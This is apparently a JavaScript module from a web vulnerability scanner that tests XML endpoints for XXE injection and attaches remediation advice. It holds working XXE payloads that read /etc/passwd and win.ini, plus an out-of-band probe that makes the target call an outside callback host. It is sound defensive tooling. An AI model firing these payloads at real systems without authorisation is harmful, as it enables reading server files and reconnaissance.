/**
 * Feature 7C — XML External Entity (XXE) Injection Scanner Module
 *
 * Only targets endpoints that accept XML content types.
 * Detection: response contains Unix passwd / Windows ini content, or OAST callback.
 */

import { sendProbe, makeFinding } from './index.js';

// ─── Target content types ─────────────────────────────────────────────────────

const XML_CONTENT_TYPES = [
  'application/xml',
  'text/xml',
  'application/soap+xml',
  'application/xhtml+xml',
];

// ─── XXE payloads (static constants) ─────────────────────────────────────────

const XXE_FILE_UNIX = (body) => `<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
${_injectEntity(body, '&xxe;')}`;

const XXE_FILE_WIN = (body) => `<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
${_injectEntity(body, '&xxe;')}`;

// OAST-based XXE
const XXE_OAST = (body, callbackUrl) => `<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "${callbackUrl}">]>
${_injectEntity(body, '&xxe;')}`;

// Detection patterns
const UNIX_PASSWD_PATTERN = /root:x:0:0:|daemon:x:|nobody:x:/;
const WIN_INI_PATTERN     = /\[fonts\]|MSDOS=/i;

// ─── Module runner ────────────────────────────────────────────────────────────

export async function runXxe(target, opts) {
  const { signal, timeoutMs, oastCallbackUrl } = opts;
  const findings = [];

  // Only test XML endpoints
  const ct = (target.requestHeaders?.['content-type'] || target.requestHeaders?.['Content-Type'] || '').toLowerCase();
  if (!XML_CONTENT_TYPES.some(t => ct.includes(t))) return findings;

  const baseBody = target.body || '<root/>';

  // ── 1. Unix /etc/passwd read ───────────────────────────────────────────────
  try {
    const payload = XXE_FILE_UNIX(baseBody);
    const resp    = await sendProbe(
      { method: target.method, url: target.url, headers: target.requestHeaders, body: payload, timeoutMs },
      signal,
    );
    if (UNIX_PASSWD_PATTERN.test(resp.body)) {
      findings.push(makeFinding({
        severity:    'critical',
        type:        'xxe',
        title:       'XXE — Local File Read (/etc/passwd)',
        description: `The endpoint at ${target.url} is vulnerable to XXE injection. The injected payload successfully read /etc/passwd from the server.`,
        url:         target.url,
        payload,
        evidence:    {
          request:  `${target.method} ${target.url}`,
          response: resp.body.slice(0, 500),
        },
        remediation: 'Disable external entity processing in your XML parser. Use a safe XML parsing library configuration (e.g., set FEATURE_SECURE_PROCESSING in Java SAX/DOM parsers).',
        references:  ['CWE-611', 'OWASP A05:2021'],
      }));
      return findings; // Critical found — skip remaining probes
    }
  } catch (err) {
    if (err.name === 'AbortError') return findings;
  }

  // ── 2. Windows win.ini read ────────────────────────────────────────────────
  try {
    const payload = XXE_FILE_WIN(baseBody);
    const resp    = await sendProbe(
      { method: target.method, url: target.url, headers: target.requestHeaders, body: payload, timeoutMs },
      signal,
    );
    if (WIN_INI_PATTERN.test(resp.body)) {
      findings.push(makeFinding({
        severity:    'critical',
        type:        'xxe',
        title:       'XXE — Local File Read (win.ini)',
        description: `The endpoint at ${target.url} is vulnerable to XXE injection. The injected payload successfully read c:\\windows\\win.ini from the server.`,
        url:         target.url,
        payload,
        evidence:    {
          request:  `${target.method} ${target.url}`,
          response: resp.body.slice(0, 500),
        },
        remediation: 'Disable external entity processing in your XML parser.',
        references:  ['CWE-611', 'OWASP A05:2021'],
      }));
      return findings;
    }
  } catch (err) {
    if (err.name === 'AbortError') return findings;
  }

  // ── 3. Parser error delta (may indicate XXE processing attempted) ──────────
  try {
    const baseline = await sendProbe(
      { method: target.method, url: target.url, headers: target.requestHeaders, body: baseBody, timeoutMs },
      signal,
    );
    const testPayload = `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test "test">]><root>&test;</root>`;
    const testResp    = await sendProbe(
      { method: target.method, url: target.url, headers: target.requestHeaders, body: testPayload, timeoutMs },
      signal,
    );
    if (testResp.statusCode !== baseline.statusCode || Math.abs(testResp.body.length - baseline.body.length) > 5) {
      findings.push(makeFinding({
        severity:    'medium',
        type:        'xxe',
        title:       'Potential XXE — XML Entity Processing Detected',
        description: `The endpoint at ${target.url} produces different responses when XML entities are present, suggesting the parser processes external entities. Manual verification is required.`,
        url:         target.url,
        payload:     testPayload,
        evidence:    {
          request:       `${target.method} ${target.url}`,
          baselineCode:  baseline.statusCode,
          testCode:      testResp.statusCode,
          deltaBytes:    Math.abs(testResp.body.length - baseline.body.length),
        },
        remediation: 'Configure your XML parser to disallow DOCTYPE declarations and external entities.',
        references:  ['CWE-611', 'OWASP A05:2021'],
      }));
    }
  } catch (err) {
    if (err.name === 'AbortError') return findings;
  }

  // ── 4. OAST-based (blind XXE) ─────────────────────────────────────────────
  if (oastCallbackUrl && !findings.some(f => f.type === 'xxe' && f.severity === 'critical')) {
    try {
      const callbackUrl = `${oastCallbackUrl}/xxe-${crypto.randomUUID().slice(0,8)}`;
      const payload = XXE_OAST(baseBody, callbackUrl);
      await sendProbe(
        { method: target.method, url: target.url, headers: target.requestHeaders, body: payload, timeoutMs },
        signal,
      );
      findings.push(makeFinding({
        severity:    'info',
        type:        'xxe',
        title:       'XXE OAST Probe Sent',
        description: `An out-of-band callback URL was injected as an XML external entity. Monitor the OAST panel for an incoming request, which would confirm blind XXE.`,
        url:         target.url,
        payload,
        evidence:    { oastUrl: callbackUrl },
        remediation: 'Disable external entity processing in your XML parser.',
        references:  ['CWE-611', 'OWASP A05:2021'],
      }));
    } catch (err) {
      if (err.name === 'AbortError') return findings;
    }
  }

  return findings;
}

// ─── Helper: inject entity reference into existing XML body ───────────────────

function _injectEntity(body, entityRef) {
  // If there's a root element, prepend the entity ref inside it
  const rootMatch = body.match(/<([a-zA-Z][a-zA-Z0-9_:-]*)(\s[^>]*)?>([^<]*)<\//);
  if (rootMatch) {
    return body.replace(rootMatch[3], entityRef + rootMatch[3]);
  }
  return `<root>${entityRef}</root>`;
}
